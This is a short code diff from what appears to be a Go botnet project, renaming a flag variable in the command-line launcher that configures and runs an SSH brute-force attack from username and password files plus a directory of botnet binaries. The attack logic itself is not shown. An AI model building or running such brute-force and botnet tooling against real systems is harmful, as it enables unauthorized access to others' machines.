@@ -16,7 +16,7 @@ func main() {
 	portPtr := flag.Int("port", 9999, "port to connect to")
 	usernameFilePtr := flag.String("ufile", "", "username file to use for brute force attack")
 	passFilePtr := flag.String("pfile", "", "password file to use for brute force attack")
-	BinDirPtr := flag.String("bindir", "", "base location for the botnet binaries folder. It should be your gopath/src/github.com/rodzzlessa24/botnet/bin")
+	binDirPtr := flag.String("bindir", "", "base location for the botnet binaries folder. It should be your gopath/src/github.com/rodzzlessa24/botnet/bin")
 	flag.Parse()
 	args := flag.Args()
 
@@ -32,7 +32,7 @@ func main() {
 			return
 		}
 		if args[1] == "ssh" {
-			if *usernameFilePtr == "" || *passFilePtr == "" || *BinDirPtr == "" {
+			if *usernameFilePtr == "" || *passFilePtr == "" || *binDirPtr == "" {
 				fmt.Println("[ERROR] you must pass in a username, password file, and a bin base directory")
 				return
 			}
@@ -40,7 +40,7 @@ func main() {
 			a := ssh.Attack{
 				UsernameFile: *usernameFilePtr,
 				PasswordFile: *passFilePtr,
-				BinDir:       *BinDirPtr,
+				BinDir:       *binDirPtr,
 			}
 
 			a.Run()
